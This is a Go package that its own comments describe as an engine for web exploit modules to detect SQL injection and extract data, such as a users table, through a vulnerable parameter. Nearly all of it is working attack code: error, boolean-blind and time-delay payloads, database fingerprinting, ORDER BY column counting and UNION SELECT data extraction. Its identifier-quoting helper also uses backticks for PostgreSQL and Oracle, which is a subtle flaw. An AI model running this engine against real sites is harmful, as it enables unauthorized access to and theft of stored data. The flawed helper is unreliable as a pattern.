// Package sqlinject provides a pure-Go SQL injection detection and extraction
// engine. It is designed to be embedded into server/web-application exploit
// modules to confirm an injection point and pull data (e.g. a users table)
// out of a vulnerable parameter.
//
// The engine is transport-agnostic: exploit modules supply a RequestFunc that
// performs the actual HTTP request with the injection payload substituted into
// the vulnerable parameter.
package sqlinject

import (
	"fmt"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"
)

// Database identifies a relational database backend.
type Database string

const (
	DatabaseUnknown  Database = "unknown"
	DatabaseMySQL    Database = "mysql"
	DatabaseMSSQL    Database = "mssql"
	DatabasePostgres Database = "postgresql"
	DatabaseOracle   Database = "oracle"
	DatabaseSQLite   Database = "sqlite"
)

// Technique describes the SQL injection technique that confirmed the flaw.
type Technique string

const (
	TechniqueError   Technique = "error-based"
	TechniqueBoolean Technique = "boolean-based blind"
	TechniqueTime    Technique = "time-based blind"
)

// Response is a normalized HTTP response returned by a RequestFunc.
type Response struct {
	StatusCode int
	Body       []byte
}

// RequestFunc issues one request where the injection point has been replaced
// by the supplied payload. It returns the raw response and any transport error.
type RequestFunc func(payload string) (Response, error)

// Detection reports the result of a SQL injection check.
type Detection struct {
	Vulnerable bool
	Technique  Technique
	Database   Database
	Details    string
}

// String returns a human-readable summary of the detection.
func (d Detection) String() string {
	if !d.Vulnerable {
		return "not vulnerable"
	}
	return fmt.Sprintf("%s (%s)", d.Technique, d.Database)
}

// errorSignature maps a substring found in database error output to a Database.
type errorSignature struct {
	pattern *regexp.Regexp
	db      Database
}

var errorSignatures = []errorSignature{
	{regexp.MustCompile(`(?i)you have an error in your sql syntax|mysql_fetch|mysqli_`), DatabaseMySQL},
	{regexp.MustCompile(`(?i)unclosed quotation mark|microsoft oledb|odbc sql server|incorrect syntax near`), DatabaseMSSQL},
	{regexp.MustCompile(`(?i)postgresql|psql|syntax error at or near`), DatabasePostgres},
	{regexp.MustCompile(`(?i)\bORA-[0-9]{4,5}\b|pls-[0-9]{3,5}`), DatabaseOracle},
	{regexp.MustCompile(`(?i)sqlite|unrecognized token|no such column`), DatabaseSQLite},
}

// Error-inducing payloads used to elicit database error messages.
var errorPayloads = []string{
	"'",
	"'\"",
	"')",
	" AND 1=CONVERT(int, 'a')",
	" AND 1=CAST('a' AS int)",
}

// Boolean payloads used for blind detection. truePayloads must produce a result
// set while falsePayloads must not.
var booleanTruePayloads = []string{
	" AND 1=1",
	"' AND '1'='1",
	"' AND '1'='1' -- ",
}

var booleanFalsePayloads = []string{
	" AND 1=2",
	"' AND '1'='2",
	"' AND '1'='2' -- ",
}

// Time-based payloads, one per database family. Each includes a delay of the
// given number of seconds.
func timePayloads(seconds int) map[Database]string {
	return map[Database]string{
		DatabaseMySQL:    fmt.Sprintf(" AND SLEEP(%d)", seconds),
		DatabasePostgres: fmt.Sprintf("; SELECT pg_sleep(%d); -- ", seconds),
		DatabaseMSSQL:    fmt.Sprintf("; WAITFOR DELAY '0:0:%d'; -- ", seconds),
		DatabaseSQLite:   fmt.Sprintf(" AND 1=1 AND randomblob(1000000*%d)", seconds),
	}
}

// Detect probes the injection point using error-based, boolean-blind, and
// time-based techniques. It returns the first technique that confirms a
// vulnerability, or a Detection with Vulnerable=false.
func Detect(request RequestFunc) (*Detection, error) {
	detection := &Detection{Database: DatabaseUnknown}

	// 1. Error-based detection + fingerprinting.
	for _, payload := range errorPayloads {
		resp, err := request(payload)
		if err != nil {
			continue
		}
		if db := fingerprintBody(resp.Body); db != DatabaseUnknown {
			detection.Vulnerable = true
			detection.Technique = TechniqueError
			detection.Database = db
			detection.Details = "database error signature detected in response"
			return detection, nil
		}
	}

	// 2. Boolean-based blind detection.
	for index := range booleanTruePayloads {
		trueResp, errTrue := request(booleanTruePayloads[index])
		if errTrue != nil {
			continue
		}
		falseResp, errFalse := request(booleanFalsePayloads[index])
		if errFalse != nil {
			continue
		}
		if differentResponse(trueResp, falseResp) {
			detection.Vulnerable = true
			detection.Technique = TechniqueBoolean
			detection.Details = "response differs between true and false boolean conditions"
			return detection, nil
		}
	}

	// 3. Time-based blind detection (3 second delay).
	for _, db := range []Database{DatabaseMySQL, DatabasePostgres, DatabaseMSSQL, DatabaseSQLite} {
		payload := timePayloads(3)[db]
		start := time.Now()
		_, err := request(payload)
		if err != nil {
			continue
		}
		if elapsed := time.Since(start); elapsed >= 3*time.Second {
			detection.Vulnerable = true
			detection.Technique = TechniqueTime
			detection.Database = db
			detection.Details = fmt.Sprintf("time-based delay observed (%v)", elapsed.Round(time.Millisecond))
			return detection, nil
		}
	}

	return detection, nil
}

// Fingerprint attempts to determine the database backend by triggering and
// matching error signatures. Returns DatabaseUnknown when it cannot be
// determined.
func Fingerprint(request RequestFunc) Database {
	for _, payload := range errorPayloads {
		resp, err := request(payload)
		if err != nil {
			continue
		}
		if db := fingerprintBody(resp.Body); db != DatabaseUnknown {
			return db
		}
	}
	return DatabaseUnknown
}

func fingerprintBody(body []byte) Database {
	text := string(body)
	for _, signature := range errorSignatures {
		if signature.pattern.MatchString(text) {
			return signature.db
		}
	}
	return DatabaseUnknown
}

func differentResponse(a, b Response) bool {
	if a.StatusCode != b.StatusCode {
		return true
	}
	return string(a.Body) != string(b.Body)
}

// ColumnCount determines the number of columns in the original query by
// incrementing an ORDER BY clause until the backend changes its response
// (indicating the column index is out of range).
//
// The request function is expected to treat the payload as a suffix to a
// numeric value (e.g. "1 ORDER BY 1").
func ColumnCount(request RequestFunc, maxColumns int) (int, error) {
	if maxColumns <= 0 || maxColumns > 64 {
		maxColumns = 32
	}

	baseline, err := request(" ORDER BY 1")
	if err != nil {
		return 0, fmt.Errorf("sqlinject: baseline request failed: %w", err)
	}

	for column := 2; column <= maxColumns+1; column++ {
		resp, err := request(fmt.Sprintf(" ORDER BY %d", column))
		if err != nil {
			return 0, err
		}
		if differentResponse(resp, baseline) {
			return column - 1, nil
		}
		baseline = resp
	}
	return 0, fmt.Errorf("sqlinject: column count exceeds %d", maxColumns)
}

// UnionSeparator is an unlikely marker used to split concatenated output columns.
const UnionSeparator = "\x01SQI\x01"

// ConcatExpr builds a database-appropriate concatenation expression that joins
// the given column expressions with UnionSeparator delimiters. The result is a
// single SQL expression usable in a UNION SELECT output column.
func ConcatExpr(db Database, exprs []string) string {
	sep := "'" + UnionSeparator + "'"
	switch db {
	case DatabaseMSSQL:
		parts := make([]string, 0, len(exprs)*2-1)
		for index, expr := range exprs {
			if index > 0 {
				parts = append(parts, sep)
			}
			parts = append(parts, "CONVERT(varchar(8000), "+expr+")")
		}
		return strings.Join(parts, "+")
	case DatabaseOracle:
		parts := make([]string, 0, len(exprs)*2-1)
		for index, expr := range exprs {
			if index > 0 {
				parts = append(parts, sep)
			}
			parts = append(parts, expr)
		}
		return strings.Join(parts, "||")
	case DatabasePostgres, DatabaseSQLite:
		parts := make([]string, 0, len(exprs)*2-1)
		for index, expr := range exprs {
			if index > 0 {
				parts = append(parts, sep)
			}
			parts = append(parts, "CAST(COALESCE("+expr+",'') AS text)")
		}
		return strings.Join(parts, "||")
	default: // MySQL and friends
		args := append([]string{sep}, exprs...)
		return "CONCAT_WS(" + strings.Join(args, ",") + ")"
	}
}

// UnionExtract performs a UNION SELECT extraction. It tries each column as the
// output position and returns the delimited rows produced by the given
// concatenated expression (see ConcatExpr).
//
// selectExpr is the single concatenated expression to extract. Rows are split
// on UnionSeparator.
func UnionExtract(request RequestFunc, columnCount int, selectExpr string) ([][]string, error) {
	if columnCount <= 0 {
		return nil, fmt.Errorf("sqlinject: invalid column count %d", columnCount)
	}
	if selectExpr == "" {
		return nil, fmt.Errorf("sqlinject: empty select expression")
	}

	for column := 1; column <= columnCount; column++ {
		payload := buildUnionPayload(columnCount, column, selectExpr)
		resp, err := request(payload)
		if err != nil {
			continue
		}
		if strings.Contains(string(resp.Body), UnionSeparator) {
			return splitUnionRows(resp.Body), nil
		}
	}
	return nil, nil
}

// buildUnionPayload constructs a UNION SELECT payload. The concatenated
// expression is written to `outputColumn` (1-indexed) while remaining columns
// are padded with NULLs.
func buildUnionPayload(columnCount, outputColumn int, selectExpr string) string {
	values := make([]string, columnCount)
	for index := range values {
		values[index] = "NULL"
	}
	values[outputColumn-1] = selectExpr
	return " UNION SELECT " + strings.Join(values, ",") + " -- "
}

// splitUnionRows splits a raw response body containing UnionSeparator-delimited
// values into rows. Each line of the body is treated as a candidate row; lines
// containing the separator are returned as field slices.
func splitUnionRows(body []byte) [][]string {
	var rows [][]string
	for _, line := range strings.Split(string(body), "\n") {
		line = strings.TrimSpace(line)
		if !strings.Contains(line, UnionSeparator) {
			continue
		}
		fields := strings.Split(line, UnionSeparator)
		trimmed := make([]string, 0, len(fields))
		for _, field := range fields {
			field = strings.TrimSpace(field)
			if field != "" {
				trimmed = append(trimmed, field)
			}
		}
		if len(trimmed) > 0 {
			rows = append(rows, trimmed)
		}
	}
	return rows
}

// QuoteIdentifier safely quotes a table/column identifier for use in a SELECT
// expression based on the detected database.
func QuoteIdentifier(db Database, identifier string) string {
	if db == DatabaseMSSQL {
		return "[" + strings.ReplaceAll(identifier, "]", "]]") + "]"
	}
	return "`" + strings.ReplaceAll(identifier, "`", "``") + "`"
}

// Integers converts a slice of integer strings to an ordered integer slice,
// ignoring parse failures.
func Integers(values []string) []int {
	var out []int
	for _, value := range values {
		number, err := strconv.Atoi(strings.TrimSpace(value))
		if err != nil {
			continue
		}
		out = append(out, number)
	}
	sort.Ints(out)
	return out
}
